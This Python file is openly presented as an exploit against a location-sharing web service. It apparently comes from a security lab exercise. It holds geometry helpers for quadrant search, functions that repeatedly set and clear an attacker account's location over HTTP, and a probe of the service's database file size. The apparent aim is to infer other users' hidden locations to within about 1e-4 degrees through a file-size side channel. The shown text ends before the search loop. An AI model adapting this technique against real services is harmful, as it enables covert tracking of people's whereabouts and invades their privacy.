import math
import os
import collections
import random
import urllib

import numpy


# Target of the exploit.
DB_FILE = '/home/subspace/data/subspace.db'
HTTP_BASE = 'http://localhost:8080'

# How precise to get the user locations. This the approximate maximum
# distance between the point returned as the user's location and the
# user's actual location.
DB_PRECISION = 1.0e-4
DB_PRECISION_NDIGITS = 4


class Point(collections.namedtuple('Point', ['lat', 'lon'])):

    def round(self, ndigits=0):
        lat = round(self.lat, ndigits)
        lon = round(self.lon, ndigits)
        return Point(lat, lon)


class Rectangle(object):
    """
    Python version of GeoRectangle, simplified.
    """

    LAT_SOUTH_EDGE = -90.0
    LAT_NORTH_EDGE = numpy.nextafter(90.0, float('inf'))
    LON_WEST_EDGE = -180.0
    LON_EAST_EDGE = 180.0

    def __init__(self, south, north, west, east):
        self.south = south
        self.north = north
        self.west = west
        self.east = east

    def width(self):
        return self.east - self.west

    def center(self):
        return Point(
            numpy.mean([self.south, self.north]),
            numpy.mean([self.west, self.east]),
            )

    def quadrants(self):
        mid_lat, mid_lon = self.center()

        return (
            Rectangle(mid_lat, self.north, mid_lon, self.east),
            Rectangle(mid_lat, self.north, self.west, mid_lon),
            Rectangle(self.south, mid_lat, self.west, mid_lon),
            Rectangle(self.south, mid_lat, mid_lon, self.east),
            )

    def random_point(self):
        """
        Get a random point within this rectangle.
        """

        return Point(
            random.uniform(self.south, self.north),
            random.uniform(self.west, self.east),
            )

    def max_distance(self):
        """
        Get a very rough estimate at the maximum distance between any
        two points in this rectangle.
        """

        d_lat = self.north - self.south
        d_lon = self.west - self.east

        return math.sqrt(d_lat*d_lat + d_lon*d_lon)

    def contains(self, point):
        return (
            point.lat >= self.south and
            point.lat < self.north and
            point.lon >= self.west and
            point.lon < self.east
        )

    def __repr__(self):
        return 'Rectangle(%s, %s, %s, %s)' % (
            self.south,
            self.north,
            self.west,
            self.east,
            )

Rectangle.FULL = Rectangle(
    Rectangle.LAT_SOUTH_EDGE,
    Rectangle.LAT_NORTH_EDGE,
    Rectangle.LON_WEST_EDGE,
    Rectangle.LON_EAST_EDGE,
    )


# Counts of HTTP and filesystem operations
class OpStats(object):

    def __init__(self):
        self.num_http_operations = 0
        self.num_fs_operations = 0

    def __str__(self):
        return "num_http_operations, num_fs_operations = %d, %d" % (
            self.num_http_operations, self.num_fs_operations
        )

op_stats = OpStats()


url_opener = urllib.URLopener()

def set_location(credentials, point):
    """
    Set the exploit user's location.
    """

    user, password = credentials

    url_opener.open(
        '%s/update-location?username=%s&password=%s&lat=%s&lon=%s' % (
            HTTP_BASE,
            user,
            password,
            point.lat,
            point.lon,
            )
        ).close()

    op_stats.num_http_operations += 1

def unset_location(credentials):
    """
    Clear the exploit user's location.
    """

    user, password = credentials

    url_opener.open(
        '%s/update-location?username=%s&password=%s&away=true' % (
            HTTP_BASE,
            user,
            password
            )
        ).close()

    op_stats.num_http_operations += 1


def get_db_length():
    op_stats.num_fs_operations += 1
    return os.stat(DB_FILE).st_size
